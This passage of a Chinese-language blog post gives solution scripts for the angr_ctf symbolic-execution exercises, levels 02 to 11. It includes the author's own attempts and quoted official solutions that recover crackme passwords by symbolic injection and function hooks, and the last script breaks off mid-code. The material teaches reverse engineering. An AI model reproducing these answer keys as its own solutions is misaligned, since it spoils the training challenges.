simgr.explore(find = lambda s1: b&quot;Good Job.&quot; in s1.posix.dumps(1), avoid = should_avoid)

s = simgr.found[0]
flag = s.posix.dumps(0)
print(flag)
</code></pre>
<h4 id="03-angr-symbolic-registers"><a href="#03-angr-symbolic-registers" class="headerlink" title="03_angr_symbolic_registers"></a>03_angr_symbolic_registers</h4><p>和上面一样可以打通</p>
<pre><code class="python">import angr
proj = angr.Project(&#39;./angr&#39;, auto_load_libs=False)
simgr = proj.factory.simgr()
def should_avoid(state):
    # 检查输出是否包含&quot;Try again&quot;
    if b&quot;Try again&quot; in state.posix.dumps(1):
        return True
    return False
    
simgr.explore(find = lambda s1: b&quot;Good Job.&quot; in s1.posix.dumps(1), avoid = should_avoid)

s = simgr.found[0]
flag = s.posix.dumps(0)
print(flag)
</code></pre>
<p>不过官方exp是打算让分段打（yysy，看起来没啥用，也就是省去了初始化的一些时间，不会优化太多）：</p>
<pre><code class="python"># Angr doesn&#39;t currently support reading multiple things with scanf (Ex: 
# scanf(&quot;%u %u).) You will have to tell the simulation engine to begin the
# program after scanf is called and manually inject the symbols into registers.

import angr
import claripy
import sys

def main(argv):
  path_to_binary = argv[1]
  project = angr.Project(path_to_binary)

  # Sometimes, you want to specify where the program should start. The variable
  # start_address will specify where the symbolic execution engine should begin.
  # Note that we are using blank_state, not entry_state.
  # (!)
  start_address = 0x80488c7  # :integer (probably hexadecimal)
  initial_state = project.factory.blank_state(
    addr=start_address,
    add_options = &#123; angr.options.SYMBOL_FILL_UNCONSTRAINED_MEMORY,
                    angr.options.SYMBOL_FILL_UNCONSTRAINED_REGISTERS&#125;
  )

  # Create a symbolic bitvector (the datatype Angr uses to inject symbolic
  # values into the binary.) The first parameter is just a name Angr uses
  # to reference it. 
  # You will have to construct multiple bitvectors. Copy the two lines below
  # and change the variable names. To figure out how many (and of what size)
  # you need, dissassemble the binary and determine the format parameter passed
  # to scanf.
  # (!)
  password0_size_in_bits = 32  # :integer
  password0 = claripy.BVS(&#39;password0&#39;, password0_size_in_bits)

  password1_size_in_bits = 32  # :integer
  password1 = claripy.BVS(&#39;password1&#39;, password1_size_in_bits)

  password2_size_in_bits = 32  # :integer
  password2 = claripy.BVS(&#39;password2&#39;, password2_size_in_bits)

  # Set a register to a symbolic value. This is one way to inject symbols into
  # the program.
  # initial_state.regs stores a number of convenient attributes that reference
  # registers by name. For example, to set eax to password0, use:
  #
  # initial_state.regs.eax = password0
  #
  # You will have to set multiple registers to distinct bitvectors. Copy and
  # paste the line below and change the register. To determine which registers
  # to inject which symbol, dissassemble the binary and look at the instructions
  # immediately following the call to scanf.
  # (!)
  initial_state.regs.eax = password0
  initial_state.regs.ebx = password1
  initial_state.regs.edx = password2

  simulation = project.factory.simgr(initial_state)

  def is_successful(state):
    stdout_output = state.posix.dumps(sys.stdout.fileno())
    return &#39;Good Job.&#39;.encode() in stdout_output

  def should_abort(state):
    stdout_output = state.posix.dumps(sys.stdout.fileno())
    return &#39;Try again.&#39;.encode() in stdout_output

  simulation.explore(find=is_successful, avoid=should_abort)

  if simulation.found:
    solution_state = simulation.found[0]

    # Solve for the symbolic values. If there are multiple solutions, we only
    # care about one, so we can use eval, which returns any (but only one)
    # solution. Pass eval the bitvector you want to solve for.
    # (!)
    solution0 = solution_state.solver.eval(password0)
    solution1 = solution_state.solver.eval(password1)
    solution2 = solution_state.solver.eval(password2)

    # Aggregate and format the solutions you computed above, and then print
    # the full string. Pay attention to the order of the integers, and the
    # expected base (decimal, octal, hexadecimal, etc).
    solution = &#39; &#39;.join(map(&#39;&#123;:x&#125;&#39;.format, [ solution0, solution1, solution2 ]))  # :string
    print(solution)
  else:
    raise Exception(&#39;Could not find the solution&#39;)

if __name__ == &#39;__main__&#39;:
  main(sys.argv)
</code></pre>
<h4 id="04-angr-symbolic-stack"><a href="#04-angr-symbolic-stack" class="headerlink" title="04_angr_symbolic_stack"></a>04_angr_symbolic_stack</h4><p>老exp还是可以打通…..不过官方exp是要求把栈模拟一下的，贴一下先</p>
<pre><code class="python"># This challenge will be more challenging than the previous challenges that you
# have encountered thus far. Since the goal of this CTF is to teach symbolic
# execution and not how to construct stack frames, these comments will work you
# through understanding what is on the stack.
#   ! ! !
# IMPORTANT: Any addresses in this script aren&#39;t necessarily right! Dissassemble
#            the binary yourself to determine the correct addresses!
#   ! ! !

import angr
import claripy
import sys

def main(argv):
  path_to_binary = argv[1]
  project = angr.Project(path_to_binary)

  # For this challenge, we want to begin after the call to scanf. Note that this
  # is in the middle of a function.
  #
  # This challenge requires dealing with the stack, so you have to pay extra
  # careful attention to where you start, otherwise you will enter a condition
  # where the stack is set up incorrectly. In order to determine where after
  # scanf to start, we need to look at the dissassembly of the call and the
  # instruction immediately following it:
  #   sub    $0x4,%esp
  #   lea    -0x10(%ebp),%eax
  #   push   %eax
  #   lea    -0xc(%ebp),%eax
  #   push   %eax
  #   push   $0x80489c3
  #   call   8048370 &lt;__isoc99_scanf@plt&gt;
  #   add    $0x10,%esp
  # Now, the question is: do we start on the instruction immediately following
  # scanf (add $0x10,%esp), or the instruction following that (not shown)?
  # Consider what the &#39;add $0x10,%esp&#39; is doing. Hint: it has to do with the
  # scanf parameters that are pushed to the stack before calling the function.
  # Given that we are not calling scanf in our Angr simulation, where should we
  # start?
  # (!)
  start_address = 0x80486ae
  initial_state = project.factory.blank_state(
    addr=start_address,
    add_options = &#123; angr.options.SYMBOL_FILL_UNCONSTRAINED_MEMORY,
                    angr.options.SYMBOL_FILL_UNCONSTRAINED_REGISTERS&#125;
  )

  # We are jumping into the middle of a function! Therefore, we need to account
  # for how the function constructs the stack. The second instruction of the
  # function is:
  #   mov    %esp,%ebp
  # At which point it allocates the part of the stack frame we plan to target:
  #   sub    $0x18,%esp
  # Note the value of esp relative to ebp. The space between them is (usually)
  # the stack space. Since esp was decreased by 0x18
  #
  #        /-------- The stack --------\
  # ebp -&gt; |                           |
  #        |---------------------------|
  #        |                           |
  #        |---------------------------|
  #         . . . (total of 0x18 bytes)
  #         . . . Somewhere in here is
  #         . . . the data that stores
  #         . . . the result of scanf.
  # esp -&gt; |                           |
  #        \---------------------------/
  #
  # Since we are starting after scanf, we are skipping this stack construction
  # step. To make up for this, we need to construct the stack ourselves. Let us
  # start by initializing ebp in the exact same way the program does.
  initial_state.regs.ebp = initial_state.regs.esp

  # scanf(&quot;%u %u&quot;) needs to be replaced by injecting two bitvectors. The
  # reason for this is that Angr does not (currently) automatically inject
  # symbols if scanf has more than one input parameter. This means Angr can
  # handle &#39;scanf(&quot;%u&quot;)&#39;, but not &#39;scanf(&quot;%u %u&quot;)&#39;.
  # You can either copy and paste the line below or use a Python list.
  # (!)
  password0 = claripy.BVS(&#39;password0&#39;, 32)
  password1 = claripy.BVS(&#39;password1&#39;, 32)

  # Here is the hard part. We need to figure out what the stack looks like, at
  # least well enough to inject our symbols where we want them. In order to do
  # that, let&#39;s figure out what the parameters of scanf are:
  #   sub    $0x4,%esp
  #   lea    -0x10(%ebp),%eax
  #   push   %eax
  #   lea    -0xc(%ebp),%eax
  #   push   %eax
  #   push   $0x80489c3
  #   call   8048370 &lt;__isoc99_scanf@plt&gt;
  #   add    $0x10,%esp 
  # As you can see, the call to scanf looks like this:
  # scanf(  0x80489c3,   ebp - 0xc,   ebp - 0x10  )
  #      format_string    password0    password1
  #  From this, we can construct our new, more accurate stack diagram:
  #
  #            /-------- The stack --------\
  # ebp -&gt;     |          padding          |
  #            |---------------------------|
  # ebp - 0x01 |       more padding        |
  #            |---------------------------|
  # ebp - 0x02 |     even more padding     |
  #            |---------------------------|
  #                        . . .               &lt;- How much padding? Hint: how
  #            |---------------------------|      many bytes is password0?
  # ebp - 0x0b |   password0, second byte  |
  #            |---------------------------|
  # ebp - 0x0c |   password0, first byte   |
  #            |---------------------------|
  # ebp - 0x0d |   password1, last byte    |
  #            |---------------------------|
  #                        . . .
  #            |---------------------------|
  # ebp - 0x10 |   password1, first byte   |
  #            |---------------------------|
  #                        . . .
  #            |---------------------------|
  # esp -&gt;     |                           |
  #            \---------------------------/
  #
  # Figure out how much space there is and allocate the necessary padding to
  # the stack by decrementing esp before you push the password bitvectors.
  padding_length_in_bytes = 8  # :integer
  initial_state.regs.esp -= padding_length_in_bytes

  # Push the variables to the stack. Make sure to push them in the right order!
  # The syntax for the following function is:
  #
  # initial_state.stack_push(bitvector)
  #
  # This will push the bitvector on the stack, and increment esp the correct
  # amount. You will need to push multiple bitvectors on the stack.
  # (!)
  initial_state.stack_push(password0)  # :bitvector (claripy.BVS, claripy.BVV, claripy.BV)
  initial_state.stack_push(password1)

  simulation = project.factory.simgr(initial_state)

  def is_successful(state):
    stdout_output = state.posix.dumps(sys.stdout.fileno())
    return &#39;Good Job.&#39;.encode() in stdout_output

  def should_abort(state):
    stdout_output = state.posix.dumps(sys.stdout.fileno())
    return &#39;Try again.&#39;.encode() in stdout_output

  simulation.explore(find=is_successful, avoid=should_abort)

  if simulation.found:
    solution_state = simulation.found[0]

    solution0 = solution_state.solver.eval(password0)
    solution1 = solution_state.solver.eval(password1)

    solution = &#39; &#39;.join(map(str, [ solution0, solution1 ]))
    print(solution)
  else:
    raise Exception(&#39;Could not find the solution&#39;)

if __name__ == &#39;__main__&#39;:
  main(sys.argv)
</code></pre>
<p>分析一下：</p>
<p>主要是这里：</p>
<p><img src="/2023/10/24/angr%E5%88%9D%E6%8E%A2/image-20231024162621516.png" alt="image-20231024162621516"></p>
<p>实际上就是找到栈上的参数，用于做初始化状态，再进行符号执行</p>
<h4 id="05-angr-symbolic-memory"><a href="#05-angr-symbolic-memory" class="headerlink" title="05_angr_symbolic_memory"></a>05_angr_symbolic_memory</h4><p>对应到全局变量的方法</p>
<pre><code class="python">import angr
import claripy
import sys
proj = angr.Project(&#39;./angr&#39;, auto_load_libs=False)
start_address = 0x8049299
initial_state = proj.factory.blank_state(
  addr=start_address,
  add_options = &#123; angr.options.SYMBOL_FILL_UNCONSTRAINED_MEMORY,
                  angr.options.SYMBOL_FILL_UNCONSTRAINED_REGISTERS&#125;
)

password0 = claripy.BVS(&#39;password0&#39;, 8*8)
password1 = claripy.BVS(&#39;password1&#39;, 8*8)
password2 = claripy.BVS(&#39;password2&#39;, 8*8)
password3 = claripy.BVS(&#39;password3&#39;, 8*8)
password0_address = 0xBFA1EE0
initial_state.memory.store(password0_address, password0)
password1_address = 0xBFA1EE0 + 8
initial_state.memory.store(password1_address, password1)
password2_address = 0xBFA1EE0 + 16
initial_state.memory.store(password2_address, password2)
password3_address = 0xBFA1EE0 + 24
initial_state.memory.store(password3_address, password3)

simgr = proj.factory.simgr(initial_state)

def is_successful(state):
    stdout_output = state.posix.dumps(sys.stdout.fileno())
    return &#39;Good Job.&#39;.encode() in stdout_output
      
def should_abort(state):
    stdout_output = state.posix.dumps(sys.stdout.fileno())
    return &#39;Try again.&#39;.encode() in stdout_output
    
simgr.explore(find = is_successful, avoid = should_abort)
solution_state = simgr.found[0]
solution0 = solution_state.solver.eval(password0,cast_to=bytes).decode()
solution1 = solution_state.solver.eval(password1,cast_to=bytes).decode()
solution2 = solution_state.solver.eval(password2,cast_to=bytes).decode()
solution3 = solution_state.solver.eval(password3,cast_to=bytes).decode()
solution = &#39; &#39;.join([ solution0, solution1, solution2, solution3 ])
print(solution)
</code></pre>
<h4 id="06-angr-symbolic-dynamic-memory"><a href="#06-angr-symbolic-dynamic-memory" class="headerlink" title="06_angr_symbolic_dynamic_memory"></a>06_angr_symbolic_dynamic_memory</h4><p><del>最早的仍旧能打通</del></p>
<p>不过这题主要还是教你把堆模拟（分配未分配过的内存即可）</p>
<pre><code class="python">fake_heap_address0 = 0x4444444
pointer_to_malloc_memory_address0 = 0xa2def74
initial_state.memory.store(pointer_to_malloc_memory_address0, fake_heap_address0, endness=project.arch.memory_endness, size=4)
fake_heap_address1 = 0x4444454
pointer_to_malloc_memory_address1 = 0xa2def7c
initial_state.memory.store(pointer_to_malloc_memory_address1, fake_heap_address1, endness=project.arch.memory_endness, size=4)

# Store our symbolic values at our fake_heap_address. Look at the binary to
# determine the offsets from the fake_heap_address where scanf writes.
# (!)
initial_state.memory.store(fake_heap_address0, password0)
initial_state.memory.store(fake_heap_address1, password1)
</code></pre>
<h4 id="07-angr-symbolic-file"><a href="#07-angr-symbolic-file" class="headerlink" title="07_angr_symbolic_file"></a>07_angr_symbolic_file</h4><p><del>最早的仍旧能打通，而且官方的反而打不通ee</del></p>
<p>还是贴一个官方的吧，其实就是教怎么模拟文件</p>
<pre><code class="python"># This challenge could, in theory, be solved in multiple ways. However, for the
# sake of learning how to simulate an alternate filesystem, please solve this
# challenge according to structure provided below. As a challenge, once you have
# an initial solution, try solving this in an alternate way.
#
# Problem description and general solution strategy:
# The binary loads the password from a file using the fread function. If the
# password is correct, it prints &quot;Good Job.&quot; In order to keep consistency with
# the other challenges, the input from the console is written to a file in the 
# ignore_me function. As the name suggests, ignore it, as it only exists to
# maintain consistency with other challenges.
# We want to:
# 1. Determine the file from which fread reads.
# 2. Use Angr to simulate a filesystem where that file is replaced with our own
#    simulated file.
# 3. Initialize the file with a symbolic value, which will be read with fread
#    and propogated through the program.
# 4. Solve for the symbolic input to determine the password.

import angr
import claripy
import sys

def main(argv):
  path_to_binary = argv[1]
  project = angr.Project(path_to_binary)

  start_address = 0x80488bc
  initial_state = project.factory.blank_state(
    addr=start_address,
    add_options = &#123; angr.options.SYMBOL_FILL_UNCONSTRAINED_MEMORY,
                    angr.options.SYMBOL_FILL_UNCONSTRAINED_REGISTERS&#125;
  )

  # Specify some information needed to construct a simulated file. For this
  # challenge, the filename is hardcoded, but in theory, it could be symbolic. 
  # Note: to read from the file, the binary calls
  # &#39;fread(buffer, sizeof(char), 64, file)&#39;.
  # (!)
  filename = &#39;FOQVSBZB.txt&#39;  # :string
  symbolic_file_size_bytes = 8

  # Construct a bitvector for the password and then store it in the file&#39;s
  # backing memory. For example, imagine a simple file, &#39;hello.txt&#39;:
  #
  # Hello world, my name is John.
  # ^                       ^
  # ^ address 0             ^ address 24 (count the number of characters)
  # In order to represent this in memory, we would want to write the string to
  # the beginning of the file:
  #
  # hello_txt_contents = claripy.BVV(&#39;Hello world, my name is John.&#39;, 30*8)
  #
  # Perhaps, then, we would want to replace John with a
  # symbolic variable. We would call:
  #
  # name_bitvector = claripy.BVS(&#39;symbolic_name&#39;, 4*8)
  #
  # Then, after the program calls fopen(&#39;hello.txt&#39;, &#39;r&#39;) and then
  # fread(buffer, sizeof(char), 30, hello_txt_file), the buffer would contain
  # the string from the file, except four symbolic bytes where the name would be
  # stored.
  # (!)
  password = claripy.BVS(&#39;password&#39;, symbolic_file_size_bytes * 8)

  # Construct the symbolic file. The file_options parameter specifies the Linux
  # file permissions (read, read/write, execute etc.) The content parameter
  # specifies from where the stream of data should be supplied. If content is
  # an instance of SimSymbolicMemory (we constructed one above), the stream will
  # contain the contents (including any symbolic contents) of the memory,
  # beginning from address zero.
  # Set the content parameter to our BVS instance that holds the symbolic data.
  # (!)
  password_file = angr.storage.SimFile(filename, content=password)
  
  # Add the symbolic file we created to the symbolic filesystem.
  initial_state.fs.insert(filename, password_file)

  simulation = project.factory.simgr(initial_state)

  def is_successful(state):
    stdout_output = state.posix.dumps(sys.stdout.fileno())
    return &#39;Good Job.&#39;.encode() in stdout_output

  def should_abort(state):
    stdout_output = state.posix.dumps(sys.stdout.fileno())
    return &#39;Try again.&#39;.encode() in stdout_output

  simulation.explore(find=is_successful, avoid=should_abort)

  if simulation.found:
    solution_state = simulation.found[0]

    solution = solution_state.solver.eval(password,cast_to=bytes).decode()

    print(solution)
  else:
    raise Exception(&#39;Could not find the solution&#39;)

if __name__ == &#39;__main__&#39;:
  main(sys.argv)
</code></pre>
<p>ps. 找到issue了：</p>
<p>Scaffold and solution challenge 07 are not working with latest angr, because SimFile class changed.</p>
<p>This is working code with latest version of angr for the filesystem part:</p>
<pre><code>  filename = &quot;OJKSQYDP.txt&quot;  # :string
  symbolic_file_size_bytes = 64

  password = claripy.BVS(&#39;password&#39;, symbolic_file_size_bytes * 8)
  password_file = angr.storage.SimFile(filename, content=password, size=symbolic_file_size_bytes)

  initial_state.fs.insert(filename, password_file)
  simulation = project.factory.simgr(initial_state)
</code></pre>
<p>TODO：改了issue仍旧打不通</p>
<h4 id="08-angr-constraints"><a href="#08-angr-constraints" class="headerlink" title="08_angr_constraints"></a>08_angr_constraints</h4><p><del>老exp打不通了，好耶（什）</del></p>
<p>原理：</p>
<pre><code># While you, as a human, can easily determine that this function is equivalent
# to simply comparing the strings, the computer cannot. Instead the computer 
# would need to branch every time the if statement in the loop was called (16 
# times), resulting in 2^16 = 65,536 branches, which will take too long of a 
# time to evaluate for our needs.
</code></pre>
<p>TODO：这里尝试过在check的jnz地址处对zf寄存器状态做剪枝，也跑不出来，后续看看为啥</p>
<p>官方给的解法是手动获取模拟比较（设置终止状态在真正的check之前，然后手动设置比较），将其转化为constraint，约束求解得到最终结果，贴一个吧先：</p>
<pre><code class="python">import angr
import claripy
import sys

def main(argv):
  path_to_binary = argv[1]
  project = angr.Project(path_to_binary)

  start_address = 0x80492ED
  initial_state = project.factory.blank_state(
    addr=start_address,
    add_options = &#123; angr.options.SYMBOL_FILL_UNCONSTRAINED_MEMORY,
                    angr.options.SYMBOL_FILL_UNCONSTRAINED_REGISTERS&#125;
  )
  password = claripy.BVS(&#39;password&#39;, 8*16)

  password_address = 0x804C034
  initial_state.memory.store(password_address, password)

  simulation = project.factory.simgr(initial_state)

  address_to_check_constraint = 0x804933E
  simulation.explore(find=address_to_check_constraint)

  if simulation.found:
    solution_state = simulation.found[0]
    
    constrained_parameter_address = 0x804C034
    constrained_parameter_size_bytes = 16
    constrained_parameter_bitvector = solution_state.memory.load(
      constrained_parameter_address,
      constrained_parameter_size_bytes
    )

    constrained_parameter_desired_value = &#39;PPBVDNMJABAQHZQQ&#39;.encode()

    solution_state.add_constraints(constrained_parameter_bitvector == constrained_parameter_desired_value)

    solution = solution_state.solver.eval(password,cast_to=bytes).decode()

    print(solution)
  else:
    raise Exception(&#39;Could not find the solution&#39;)

if __name__ == &#39;__main__&#39;:
  main(sys.argv)
</code></pre>
<h4 id="09-angr-hooks"><a href="#09-angr-hooks" class="headerlink" title="09_angr_hooks"></a>09_angr_hooks</h4><p><del>他说要hook，但是我强行给他分段打通楽（什）</del></p>
<p>一开始写的exp（注意给password初始值写上，开始的时候忘了）可以打通</p>
<pre><code class="python">import angr
import claripy
import sys

def main(argv):
  path_to_binary = argv[1]
  project = angr.Project(path_to_binary)

  start_address = 0x80492FD
  initial_state = project.factory.blank_state(
    addr=start_address,
    add_options = &#123; angr.options.SYMBOL_FILL_UNCONSTRAINED_MEMORY,
                    angr.options.SYMBOL_FILL_UNCONSTRAINED_REGISTERS&#125;
  )
  password = claripy.BVS(&#39;password&#39;, 8*16)

  password_address = 0x804C038
  initial_state.memory.store(password_address, password)

  simulation = project.factory.simgr(initial_state)

  address_to_check_constraint = 0x804934E
  simulation.explore(find=address_to_check_constraint)

  if simulation.found:
    solution_state = simulation.found[0]
    
    constrained_parameter_address = 0x804C038
    constrained_parameter_size_bytes = 16
    constrained_parameter_bitvector = solution_state.memory.load(
      constrained_parameter_address,
      constrained_parameter_size_bytes
    )

    constrained_parameter_desired_value = &#39;PPBVDNMJABAQHZQQ&#39;.encode()

    solution_state.add_constraints(constrained_parameter_bitvector == constrained_parameter_desired_value)

    solution = solution_state.solver.eval(password,cast_to=bytes).decode()

    print(solution)
  else:
    raise Exception(&#39;Could not find the solution&#39;)


#################################################
  path_to_binary = argv[1]
  project = angr.Project(path_to_binary)
  start_address = 0x804935B
  initial_state = project.factory.blank_state(
    addr=start_address,
    add_options = &#123; angr.options.SYMBOL_FILL_UNCONSTRAINED_MEMORY,
                    angr.options.SYMBOL_FILL_UNCONSTRAINED_REGISTERS&#125;
  )
  password = claripy.BVS(&#39;password&#39;, 8*16)

  password_address = 0x804C038
  initial_state.memory.store(password_address, password)

# 这里记得把password初始值写入
  pwd_addr = 0x804C04C
  pwd = b&#39;PPBVDNMJABAQHZQQ&#39;
  initial_state.memory.store(pwd_addr, pwd)

  simulation = project.factory.simgr(initial_state)

  address_to_check_constraint = 0x80493A3
  simulation.explore(find=address_to_check_constraint)

  if simulation.found:
    solution_state = simulation.found[0]
    
    constrained_parameter_address = 0x804C038
    constrained_parameter_size_bytes = 16
    constrained_parameter_bitvector = solution_state.memory.load(
      constrained_parameter_address,
      constrained_parameter_size_bytes
    )

    check = solution_state.memory.load(
      pwd_addr,
      constrained_parameter_size_bytes
    )
    constrained_parameter_desired_value = check

    solution_state.add_constraints(constrained_parameter_bitvector == constrained_parameter_desired_value)

    solution = solution_state.solver.eval(password,cast_to=bytes).decode()

    print(solution)
  else:
    raise Exception(&#39;Could not find the solution???&#39;)

if __name__ == &#39;__main__&#39;:
  main(sys.argv)
</code></pre>
<p>然后看看官方怎么hook的</p>
<p>结论是这么写将中间那个过不去的函数转化为手动的check，那比上一个的做法还简洁点点</p>
<p>主要就是这里：</p>
<p><img src="/2023/10/24/angr%E5%88%9D%E6%8E%A2/image-20231024213817285.png" alt="image-20231024213817285"></p>
<p>直接贴一个：</p>
<pre><code class="python"># This level performs the following computations:
#
# 1. Get 16 bytes of user input and encrypt it.
# 2. Save the result of check_equals_AABBCCDDEEFFGGHH (or similar)
# 3. Get another 16 bytes from the user and encrypt it.
# 4. Check that it&#39;s equal to a predefined password.
#
# The ONLY part of this program that we have to worry about is #2. We will be
# replacing the call to check_equals_ with our own version, using a hook, since
# check_equals_ will run too slowly otherwise.

import angr
import claripy
import sys

def main(argv):
  path_to_binary = argv[1]
  project = angr.Project(path_to_binary)

  # Since Angr can handle the initial call to scanf, we can start from the
  # beginning.
  initial_state = project.factory.entry_state(
    add_options = &#123; angr.options.SYMBOL_FILL_UNCONSTRAINED_MEMORY,
                    angr.options.SYMBOL_FILL_UNCONSTRAINED_REGISTERS&#125;
  )

  # Hook the address of where check_equals_ is called.
  # (!)
  check_equals_called_address = 0x80486ca

  # The length parameter in angr.Hook specifies how many bytes the execution
  # engine should skip after completing the hook. This will allow hooks to
  # replace certain instructions (or groups of instructions). Determine the
  # instructions involved in calling check_equals_, and then determine how many
  # bytes are used to represent them in memory. This will be the skip length.
  # (!)
  instruction_to_skip_length = 5
  @project.hook(check_equals_called_address, length=instruction_to_skip_length)
  def skip_check_equals_(state):
    # Determine the address where user input is stored. It is passed as a
    # parameter ot the check_equals_ function. Then, load the string. Reminder:
    # int check_equals_(char* to_check, int length) &#123; ...
    user_input_buffer_address = 0x804a044 # :integer, probably hexadecimal
    user_input_buffer_length = 16

    # Reminder: state.memory.load will read the stored value at the address
    # user_input_buffer_address of byte length user_input_buffer_length.
    # It will return a bitvector holding the value. This value can either be
    # symbolic or concrete, depending on what was stored there in the program.
    user_input_string = state.memory.load(
      user_input_buffer_address,
      user_input_buffer_length
    )
    
    # Determine the string this function is checking the user input against.
    # It&#39;s encoded in the name of this function; decompile the program to find
    # it.
    check_against_string = &#39;OSIWHBXIFOQVSBZB&#39;.encode() # :string

    # gcc uses eax to store the return value, if it is an integer. We need to
    # set eax to 1 if check_against_string == user_input_string and 0 otherwise.
    # However, since we are describing an equation to be used by z3 (not to be
    # evaluated immediately), we cannot use Python if else syntax. Instead, we 
    # have to use claripy&#39;s built in function that deals with if statements.
    # claripy.If(expression, ret_if_true, ret_if_false) will output an
    # expression that evaluates to ret_if_true if expression is true and
    # ret_if_false otherwise.
    # Think of it like the Python &quot;value0 if expression else value1&quot;.
    state.regs.eax = claripy.If(
      user_input_string == check_against_string, 
      claripy.BVV(1, 32), 
      claripy.BVV(0, 32)
    )

  simulation = project.factory.simgr(initial_state)

  def is_successful(state):
    stdout_output = state.posix.dumps(sys.stdout.fileno())
    return &#39;Good Job.&#39;.encode() in stdout_output

  def should_abort(state):
    stdout_output = state.posix.dumps(sys.stdout.fileno())
    return &#39;Try again.&#39;.encode() in stdout_output

  simulation.explore(find=is_successful, avoid=should_abort)

  if simulation.found:
    solution_state = simulation.found[0]

    # Since we are allowing Angr to handle the input, retrieve it by printing
    # the contents of stdin. Use one of the early levels as a reference.
    solution = solution_state.posix.dumps(sys.stdin.fileno()).decode()
    print(solution)
  else:
    raise Exception(&#39;Could not find the solution&#39;)

if __name__ == &#39;__main__&#39;:
  main(sys.argv)
</code></pre>
<h4 id="10-angr-simprocedures"><a href="#10-angr-simprocedures" class="headerlink" title="10_angr_simprocedures"></a>10_angr_simprocedures</h4><p><img src="/2023/10/24/angr%E5%88%9D%E6%8E%A2/image-20231025094815541.png" alt="image-20231025094815541"></p>
<p>将check部分的basic block拆了很多很多，看源码是加了不透明谓词和分发块：</p>
<p><img src="/2023/10/24/angr%E5%88%9D%E6%8E%A2/image-20231025094941057.png" alt="image-20231025094941057"></p>
<p>ida做了的伪代码做了代码优化，看起来其实和前面两个题差不多</p>
<p>但是下面这种写法不行，不知道是为啥不能这样hook，这样hook的话约束不出来解：</p>
<p>（先hook找输入的地址，然后手写check，但是约束不出来，跑出来空解）</p>
<pre><code class="python">import angr
import claripy
import sys
user_input_buffer_address = 0
def main(argv):
    path_to_binary = argv[1]
    project = angr.Project(path_to_binary)
    
    password = claripy.BVS(&#39;password&#39;, 8*16)

    @project.hook(0x8049310)
    def skip_check_equals_(state):
        global user_input_buffer_address
        user_input_buffer_address = state.solver.eval(state.regs.eax)
        state.memory.store(user_input_buffer_address, password)

    check_equals_called_address = 0x8049362
    simulation = project.factory.simgr()
    simulation.explore(find=check_equals_called_address)

    if simulation.found:
        check_against_string = b&#39;PPBVDNMJABAQHZQQ&#39;
        solution_state = simulation.found[0]
        user_input_string = solution_state.memory.load(
            user_input_buffer_address,
            16
        )
        solution_state.add_constraints(user_input_string == check_against_string)

        print(solution_state.solver.eval(password,cast_to=bytes).decode())
    else:
        raise Exception(&#39;Could not find the solution&#39;)


if __name__ == &#39;__main__&#39;:
    main(sys.argv)
</code></pre>
<p>看看官方的吧：</p>
<pre><code class="python">import angr
import claripy
import sys

def main(argv):
  path_to_binary = argv[1]
  project = angr.Project(path_to_binary)

  initial_state = project.factory.entry_state(
    add_options = &#123; angr.options.SYMBOL_FILL_UNCONSTRAINED_MEMORY,
                    angr.options.SYMBOL_FILL_UNCONSTRAINED_REGISTERS&#125;
  )

  class ReplacementCheckEquals(angr.SimProcedure):
    def run(self, to_check, length):
      user_input_buffer_address = to_check
      user_input_buffer_length = length

      user_input_string = self.state.memory.load(
        user_input_buffer_address,
        user_input_buffer_length
      )

      check_against_string = &#39;OSIWHBXIFOQVSBZB&#39;.encode()

      return claripy.If(
        user_input_string == check_against_string,
        claripy.BVV(1, 32),
        claripy.BVV(0, 32)
      )

  check_equals_symbol = &#39;check_equals_OSIWHBXIFOQVSBZB&#39; # :string
  project.hook_symbol(check_equals_symbol, ReplacementCheckEquals())

  simulation = project.factory.simgr(initial_state)

  def is_successful(state):
    stdout_output = state.posix.dumps(sys.stdout.fileno())
    return &#39;Good Job.&#39;.encode() in stdout_output

  def should_abort(state):
    stdout_output = state.posix.dumps(sys.stdout.fileno())
    return &#39;Try again.&#39;.encode() in stdout_output

  simulation.explore(find=is_successful, avoid=should_abort)

  if simulation.found:
    solution_state = simulation.found[0]

    solution = solution_state.posix.dumps(sys.stdin.fileno()).decode()
    print(solution)
  else:
    raise Exception(&#39;Could not find the solution&#39;)

if __name__ == &#39;__main__&#39;:
  main(sys.argv)
</code></pre>
<p>定义一个类，遇到check函数后直接hook并且跳过</p>
<p>简写<del>偷</del>一个，方便看：</p>
<pre><code class="python">import angr
import claripy

class MyCheckEquals(angr.SimProcedure):
    def run(self, buffer_addr, length):
        buffer = self.state.memory.load(buffer_addr, length)
        return claripy.If(buffer == b&#39;PPBVDNMJABAQHZQQ&#39;, claripy.BVV(1, 32), claripy.BVV(0, 32))

proj = angr.Project(&#39;./angr&#39;)
proj.hook_symbol(symbol_name=&#39;check_equals_PPBVDNMJABAQHZQQ&#39;, simproc=MyCheckEquals())
state = proj.factory.entry_state()
simgr = proj.factory.simgr(state)
simgr.explore(
    find=lambda state : b&#39;Good Job.&#39; in state.posix.dumps(1),
    avoid=lambda state: b&#39;Try again.&#39; in state.posix.dumps(1)
)
print(simgr.found[0].posix.dumps(0))
</code></pre>
<p><del>所以为啥我的跑不通</del></p>
<h4 id="11-angr-sim-scanf"><a href="#11-angr-sim-scanf" class="headerlink" title="11_angr_sim_scanf"></a>11_angr_sim_scanf</h4><p>看起来比上个还过分一点</p>
<p><img src="/2023/10/24/angr%E5%88%9D%E6%8E%A2/image-20231026160856414.png" alt="image-20231026160856414"></p>
<p>看起来是很多<code>scanf</code>了</p>
<p><img src="/2023/10/24/angr%E5%88%9D%E6%8E%A2/image-20231026161037670.png" alt="image-20231026161037670"></p>
<p>这个从源程序看起来可以直接手动check秒掉，还是小写一个</p>
<p>（然后其实check也是不必要的，就这样hook就行）</p>
<pre><code class="python">import angr
import claripy
import sys
user_input_buffer_address = 0
tmp = &#39;&#39;
pwd = []
def main(argv):
    path_to_binary = argv[1]
    project = angr.Project(path_to_binary)

    @project.hook(0x80492D7)
    def skip_check_equals_(state):
        global user_input_buffer_address, tmp, pwd
        user_input_buffer_address = state.solver.eval(state.regs.eax)
        tmp += hex(state.solver.eval(state.memory.load(user_input_buffer_address,1)))[2:]
        if (len(tmp) &gt; 6):            
            tmp = [tmp[i:i+2] for i in range(len(tmp) - 2, -1 ,-2)]
            tmp = &#39;&#39;.join(tmp)
            pwd.append(int(tmp, 16))
            tmp = &#39;&#39;

    check_equals_called_address = 0x80492E1
    simulation = project.factory.simgr()
    simulation.explore(find=check_equals_called_address)
    print(pwd)

if __name__ == &#39;__main__&#39;:
